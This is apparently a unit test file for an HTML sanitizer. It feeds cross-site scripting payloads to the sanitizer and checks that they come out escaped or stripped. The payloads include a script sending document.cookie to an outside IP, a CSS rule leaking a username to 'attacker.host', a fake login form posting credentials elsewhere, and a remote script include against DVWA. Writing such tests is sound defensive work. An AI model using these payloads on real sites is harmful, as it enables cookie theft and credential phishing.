import { sanitizeHTML } from './sanitizeHTML';

/** not allowed */
const script = '<script src=""></script>';
const script2 = `<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>`;
const xhrScript = `<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
  </script>`;
const aClick = '<a onClick="() => console.log("hello world")"></a>';
const aClickLang =
  '<a lang="en-us" onClick="() => console.log("hello world")"></a>';
const css = `<style>#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}</style><input id="username" value="mikeg" />`;
const login = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>`;
const aScript = `<a href="javascript:alert(8007)">Click me</a>`;
const queryString = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">`;

/** allowed */
const a = '<a href="helloworld.com">Hello world</a>';
const aLang = '<a lang="en-us"></a>';

it('should escape script tags, retain child text, and strip attributes', () => {
  expect(sanitizeHTML(script)).toBe('&lt;script&gt;&lt;/script&gt;');
  expect(sanitizeHTML(script2)).toBe(
    '&lt;script&gt;new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;&lt;/script&gt;'
  );
  expect(sanitizeHTML(xhrScript)).toBe(
    `&lt;script&gt;
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&amp;mtxMessage=xss&amp;btnSign=Sign+Guestbook');
  &lt;/script&gt;`
  );
});

it('should escape unwanted blacklisted tags', () => {
  expect(sanitizeHTML(login)).toBe(
    '<form>Username:<br />&lt;input /&gt;<br />Password:<br />&lt;input /&gt;<br /><br />&lt;input /&gt;<br /></form>'
  );
  expect(sanitizeHTML(aScript)).toBe(`<a>Click me</a>`);
});

it('should not allow CSS attacks by escaping the style tag', () => {
  expect(sanitizeHTML(css)).toBe(
    '&lt;style&gt;#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}&lt;/style&gt;&lt;input /&gt;'
  );
});

it('should not allow query string attacks', () => {
  expect(sanitizeHTML(queryString)).toBe(
    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;&lt;/script&gt;'
  );
});

it('should only allow whitelisted HTML attributes', () => {
  expect(sanitizeHTML(aClick)).toBe('<a></a>');
  expect(sanitizeHTML(aLang)).toBe(aLang);
  expect(sanitizeHTML(aClickLang)).toBe(aLang);
  expect(sanitizeHTML(a)).toBe(a);
});
